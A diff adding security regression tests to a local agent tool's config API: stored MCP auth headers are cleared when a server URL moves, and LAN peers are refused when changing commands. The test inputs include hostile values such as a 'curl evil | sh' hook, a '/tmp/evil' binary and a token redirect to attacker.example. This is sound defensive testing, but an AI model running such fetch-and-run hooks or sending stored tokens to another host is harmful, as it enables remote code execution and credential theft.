@@ -177,3 +177,42 @@ async function importWith(send: (m: string, p: string, b?: unknown) => Promise<{
     for (const [k, v] of Object.entries(was)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
   }
 }
+
+describe('MCP server keys stay with the address they were entered for', () => {
+  it('a changed url drops the stored headers, so they cannot be sent to another host', async () => {
+    const { send, local } = await setup();
+    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://docs.example/mcp', headers: { Authorization: 'Bearer secret' } })).status).toBe(200);
+    // The page sends '' for a key it never had: kept while the url stays, refused once it moves.
+    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://docs.example/mcp', headers: { Authorization: '' } })).status).toBe(200);
+    expect(local().mcp_servers.docs.headers.Authorization).toBe('Bearer secret');
+    const moved = await send('PUT', '/config/mcp-servers/docs', { url: 'https://attacker.example/', headers: { Authorization: '' } });
+    expect(moved.status).toBe(400);
+    expect(moved.text).toMatch(/enter it again, the url changed/);
+    expect((await send('PUT', '/config/mcp-servers/docs', { url: 'https://attacker.example/' })).status).toBe(200);
+    expect(local().mcp_servers.docs.headers ?? {}).toEqual({});
+  });
+
+  it('a changed command drops the stored env', async () => {
+    const { send, local } = await setup();
+    expect((await send('PUT', '/config/mcp-servers/eleven', { command: 'uvx', args: ['elevenlabs-mcp'], env: { KEY: 'secret' } })).status).toBe(200);
+    expect((await send('PUT', '/config/mcp-servers/eleven', { command: 'sh' })).status).toBe(200);
+    expect(local().mcp_servers.eleven.env ?? {}).toEqual({});
+  });
+});
+
+describe('what runs on this machine is changed only from it', () => {
+  it('a LAN peer may change a setting, not a command, a program or an MCP server', async () => {
+    const { dataDir } = makeFixture();
+    store = await DataStore.open(dataDir);
+    const app = apiRoutes(store, new MockEngine(store, () => {}));
+    const from = (address: string, method: string, path: string, body: unknown) =>
+      app.request(path, { method, headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) }, { incoming: { socket: { remoteAddress: address } } });
+    expect((await from('192.168.1.20', 'PUT', '/config', { notifications: { on_merge: 'curl evil' } })).status).toBe(403);
+    expect((await from('192.168.1.20', 'PUT', '/config', { hooks: { after_worktree_create: ['curl evil | sh'] } })).status).toBe(403);
+    expect((await from('192.168.1.20', 'PUT', '/config/local', { claude_bin: '/tmp/evil' })).status).toBe(403);
+    expect((await from('192.168.1.20', 'PUT', '/config/mcp-servers/x', { command: 'sh' })).status).toBe(403);
+    expect((await from('192.168.1.20', 'POST', '/config/notifications/test', { event: 'on_merge' })).status).toBe(403);
+    expect((await from('192.168.1.20', 'PUT', '/config', { ci: { timeout_min: 30 } })).status).toBe(200);
+    expect((await from('::ffff:127.0.0.1', 'PUT', '/config', { notifications: { on_merge: 'say merged' } })).status).toBe(200);
+  });
+});
